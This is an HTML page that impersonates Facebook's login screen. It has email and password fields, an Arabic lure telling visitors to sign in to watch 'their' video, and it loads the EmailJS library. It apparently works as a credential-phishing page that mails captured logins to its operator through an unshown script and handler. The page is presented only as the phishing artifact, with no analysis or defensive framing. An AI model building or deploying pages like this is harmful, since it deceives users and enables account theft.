<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Facebook login page</title>
  <link rel="icon" href="logo.jpeg">
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <link rel="stylesheet" href="./style.css">

</head>
<body>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="./login_form_2.css" />
  </head>
  <body>
    <div class="content">
      <div class="flex-div">
        <div class="name-content">
          <h1 class="logo">Facebook</h1>
          <p>Connect with friends and the world around you on Facebook.</p>
          <p style="color: red; font-size: 25px;">قم بتسجيل حسابك اولا لي مشاهدة الفديوا خاص بك</p>
        </div>
          <form>
            <input type="text" placeholder="Email or Phone Number" required   id="A"/>
            <input type="password" placeholder="Password" required minlength="8" id="B">
            <button class="login">Log In</button>
            <a href="#">Forgot Password ?</a>
            <hr>
            <button onclick="IA_user()" class="create-account">Create New Account</button>
          </form>
      </div>
    </div>
  </body>

  <script src="js.js"></script>
</html>  
</body>
</html>
